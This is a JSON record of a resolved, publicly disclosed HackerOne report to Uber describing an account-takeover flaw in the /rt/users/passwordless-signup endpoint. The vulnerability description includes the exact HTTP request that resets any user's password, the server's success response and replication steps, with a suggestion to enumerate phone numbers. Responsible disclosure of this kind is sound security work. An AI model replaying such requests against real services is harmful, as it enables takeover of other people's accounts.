{
  "id": 143717,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDM3MTc=",
  "url": "https://hackerone.com/reports/143717",
  "title": "Change any Uber user's password through /rt/users/passwordless-signup - Account Takeover (critical)",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2016-06-08T16:31:39.368Z",
  "submitted_at": "2016-06-08T16:31:39.368Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "mongo",
    "url": "/mongo",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/019/482/fe5ab898025ee366ad00c3b43f2404bbccb9f160_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 314,
    "url": "https://hackerone.com/uber",
    "handle": "uber",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Uber",
      "twitter_handle": "",
      "website": "https://www.uber.com",
      "about": ""
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2016-07-14T21:38:20.440Z",
  "bug_reporter_agreed_on_going_public_at": "2016-06-28T16:22:55.088Z",
  "team_member_agreed_on_going_public_at": "2016-07-14T21:38:20.343Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Through the endpoint at /rt/users/passwordless-signup it is possible to change the password of any Uber user, given knowledge of their phone number (or by just enumerating phone numbers until one is found that is registered with Uber - not too hard given the number of Uber users).\n\nI've tested this with Riders, the same might apply to Drivers or other user roles.\n\n# Request/response\n\nHere is the request used (I've censored out my phone number):\n```\nPOST /rt/users/passwordless-signup HTTP/1.1\nHost: cn-geo1.uber.com\nUser-Agent: client/iphone/2.137.1\nConnection: close\nContent-Type: application/json\nContent-Length: 197\n\n{\"phoneNumberE164\":\"+xxxxxxxx\",\"userWorkflow\":\"PASSWORDLESS_SIGNUP\",\"userRole\":\"client\",\"mobileCountryISO2\":\"XX\",\"state\":\"CREATE_NEW_PASSWORD\",\"newPasswordData\":{\"newPassword\":\"12345678911a!\"}}\n```\n\nAnd the response:\n```\n{\"phoneNumberE164\":\"+xxxxxxxx\",\"serverState\":\"SUCCEEDED\",\"serverStateData\":{\"nextState\":\"SIGN_IN\"},\"tripVerifyStateData\":{},\"userMessage\":\"New password has been created. Please login with the new Password.\",\"userRole\":\"client\",\"userWorkflow\":\"PASSWORDLESS_SIGNUP\"}\n```\n\n# To replicate\n1. Create a new Rider account (I used the iOS app, but this probably does not matter).\n2. Replay the request shown above, changing the phoneNumberE164 field with the phone number you associated with your account (including country prefix and the plus sign, for example, +1xxx for US). You might need to replay it twice. You'll eventually get the \"New password has been created.\" message; the new password has been set. The new password will be whatever you specified in the newPassword field in the request.\n3. Login using the new password on http://riders.uber.com/ or elsewhere.",
  "weakness": {
    "id": 27,
    "name": "Improper Authentication - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2016-07-28T16:22:55.193Z",
  "allow_singular_disclosure_after": -238103429.73625815,
  "singular_disclosure_allowed": true,
  "vote_count": 294,
  "voters": [
    "fern",
    "jokebookservice1",
    "static",
    "lukasreschke",
    "omarelfarsaoui",
    "smither",
    "irvinlim",
    "m4t35z",
    "nytr0gen",
    "arneswinnen",
    "and 284 more..."
  ],
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
